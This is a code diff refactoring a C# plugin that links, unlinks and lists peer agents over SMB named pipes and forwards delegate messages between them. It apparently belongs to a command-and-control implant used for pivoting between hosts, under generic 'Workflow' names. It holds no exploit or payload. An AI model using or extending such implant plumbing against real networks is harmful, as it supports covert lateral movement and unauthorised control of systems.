@@ -1,7 +1,6 @@
 using Workflow.Contracts;
 using Workflow.Models;
 using System.Collections.Concurrent;
-using System.Text;
 using System.Text.Json;
 
 namespace Workflow
@@ -12,7 +11,9 @@ namespace Workflow
         private IServiceConfig config { get; set; }
         private IDataBroker messageManager { get; set; }
         private ILogger logger { get; set; }
-        private ConcurrentDictionary<string, SmbLink> forwarders = new ConcurrentDictionary<string, SmbLink>();
+        private ConcurrentDictionary<string, SmbLink> forwarders =
+            new ConcurrentDictionary<string, SmbLink>();
+
         public Plugin(PluginContext context)
         {
             this.messageManager = context.MessageManager;
@@ -23,11 +24,23 @@ namespace Workflow
         public async Task Execute(ServerJob job)
         {
             DebugLog.Log($"Executing {Name} [{job.task.id}]");
-            SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
+            SmbLinkArgs args;
+            try
+            {
+                args = JsonSerializer
+                    .Deserialize<SmbLinkArgs>(
+                        job.task.parameters);
+            }
+            catch (JsonException)
+            {
+                args = null;
+            }
+
             if (args is null)
             {
-                DebugLog.Log($"{Name} invalid parameters [{job.task.id}]");
-                messageManager.AddTaskResponse(new TaskResponse()
+                DebugLog.Log(
+                    $"{Name} invalid parameters [{job.task.id}]");
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     task_id = job.task.id,
                     user_output = "Invalid parameters.",
@@ -36,100 +49,139 @@ namespace Workflow
                 });
                 return;
             }
-            DebugLog.Log($"{Name} action={args.action} [{job.task.id}]");
+
+            DebugLog.Log(
+                $"{Name} action={args.action} [{job.task.id}]");
+
             switch (args.action)
             {
                 case "link":
                     await CreateNewLink(args, job.task.id);
                     break;
                 case "unlink":
-                    if (await UnlinkForwarder(job.task.id))
-                    {
-                        this.messageManager.AddTaskResponse(new TaskResponse()
-                        {
-                            task_id = job.task.id,
-                            user_output = "Link removed.",
-                            status = "error",
-                            completed = true,
-                        });
-                    }
-                    else
-                    {
-                        this.messageManager.AddTaskResponse(new TaskResponse()
-                        {
-                            task_id = job.task.id,
-                            user_output = "Failed to unlink.",
-                            status = "error",
-                            completed = true,
-                        });
-
-                    }
+                    await UnlinkAgent(args, job.task.id);
                     break;
                 case "list":
-                    await ListConnections(job);
+                    ListConnections(job);
                     break;
                 default:
+                    messageManager.AddTaskResponse(new TaskResponse
+                    {
+                        task_id = job.task.id,
+                        user_output =
+                            $"Unknown action: {args.action}",
+                        status = "error",
+                        completed = true,
+                    });
                     break;
             }
         }
 
-        public async Task CreateNewLink(SmbLinkArgs args, string task_id)
+        public async Task CreateNewLink(
+            SmbLinkArgs args, string task_id)
         {
-            //Create a new guid to track our link
-            string linkId = Guid.NewGuid().ToString();
+            var link = new SmbLink(
+                messageManager, logger, args,
+                config.uuid, task_id);
 
-            //Create our new SmbLink object
-            var link = new SmbLink(messageManager, logger, args, config.uuid, task_id);
+            EdgeResponse result = await link.Link();
 
-            //Add it to the tracker with our randomly generated guid
-            if (this.forwarders.TryAdd(linkId, link))
+            if (result.edges.Count > 0
+                && !string.IsNullOrEmpty(link.linked_agent_id))
             {
-                //Attempt to link it
-                EdgeResponse err = await this.forwarders[linkId].Link();
-                this.messageManager.AddTaskResponse(err.ToJson());
+                this.forwarders.TryAdd(
+                    link.linked_agent_id, link);
+            }
+
+            this.messageManager.AddTaskResponse(result.ToJson());
+        }
+
+        private async Task UnlinkAgent(
+            SmbLinkArgs args, string task_id)
+        {
+            var match = this.forwarders.FirstOrDefault(
+                f => f.Value.args.hostname == args.hostname
+                    && f.Value.args.pipename == args.pipename);
+
+            if (match.Value == null)
+            {
+                this.messageManager.AddTaskResponse(
+                    new TaskResponse
+                    {
+                        task_id = task_id,
+                        user_output = "Failed to unlink.",
+                        status = "error",
+                        completed = true,
+                    });
                 return;
             }
 
-            //This gets sent if we already linked to this guid, but should never practically hit.
-            this.messageManager.AddTaskResponse(new TaskResponse()
+            bool success = await match.Value.Unlink();
+
+            if (success)
             {
-                task_id = task_id,
-                user_output = "Link already exists.",
-                status = "error",
-                completed = true
-            });
-
-        }
-
-        public async Task<bool> UnlinkForwarder(string linkId)
-        {
-            return await this.forwarders[linkId].Unlink() && this.forwarders.TryRemove(linkId, out _);
+                this.forwarders.TryRemove(match.Key, out _);
+                this.messageManager.AddTaskResponse(
+                    new TaskResponse
+                    {
+                        task_id = task_id,
+                        user_output = "Link removed.",
+                        completed = true,
+                    });
+            }
+            else
+            {
+                this.messageManager.AddTaskResponse(
+                    new TaskResponse
+                    {
+                        task_id = task_id,
+                        user_output = "Failed to unlink.",
+                        status = "error",
+                        completed = true,
+                    });
+            }
         }
 
         public async Task ForwardDelegate(DelegateMessage dm)
         {
             DebugLog.Log($"{Name} ForwardDelegate uuid={dm.uuid}");
-            if (this.forwarders.Any(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid))
-            {
-                var fwdr = this.forwarders.Where(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid).First();
+            var match = this.forwarders.FirstOrDefault(
+                a => a.Value.linked_agent_id == dm.uuid
+                    || a.Value.linked_agent_id == dm.new_uuid);
 
-                if (!string.IsNullOrEmpty(dm.new_uuid))
-                {
-                    fwdr.Value.linked_agent_id = dm.new_uuid;
-                }
-                await fwdr.Value.ForwardDelegateMessage(dm);
+            if (match.Value == null)
+            {
+                return;
             }
+
+            if (!string.IsNullOrEmpty(dm.new_uuid))
+            {
+                match.Value.linked_agent_id = dm.new_uuid;
+            }
+
+            await match.Value.ForwardDelegateMessage(dm);
         }
 
-        public async Task ListConnections(ServerJob job)
+        public void ListConnections(ServerJob job)
         {
-            this.messageManager.AddTaskResponse(new TaskResponse()
-            {
-                user_output = JsonSerializer.Serialize(this.forwarders),
-                task_id = job.task.id,
-                completed = true,
+            var linkInfos = this.forwarders
+                .Select(kvp => new
+                {
+                    linked_agent_id = kvp.Value.linked_agent_id,
+                    connected = kvp.Value.connected,
+                    pipename = kvp.Value.args.pipename,
+                    hostname = kvp.Value.args.hostname,
+                })
+                .ToList();
 
-            });
+            this.messageManager.AddTaskResponse(
+                new TaskResponse
+                {
+                    user_output =
+                        JsonSerializer.Serialize(linkInfos),
+                    task_id = job.task.id,
+                    completed = true,
+                });
         }
     }
 }
